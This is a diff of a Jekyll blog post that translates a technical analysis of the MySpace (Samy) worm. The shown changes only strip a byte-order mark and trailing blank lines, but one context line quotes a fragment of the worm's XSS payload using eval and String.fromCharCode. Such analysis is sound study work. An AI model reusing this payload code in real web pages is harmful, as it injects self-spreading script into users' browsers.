@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: "[译]MySpace蠕虫技术分析"
 category: front-end
@@ -88,7 +88,3 @@ script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);var
 ```
 
 \- samy
-
-
-
-
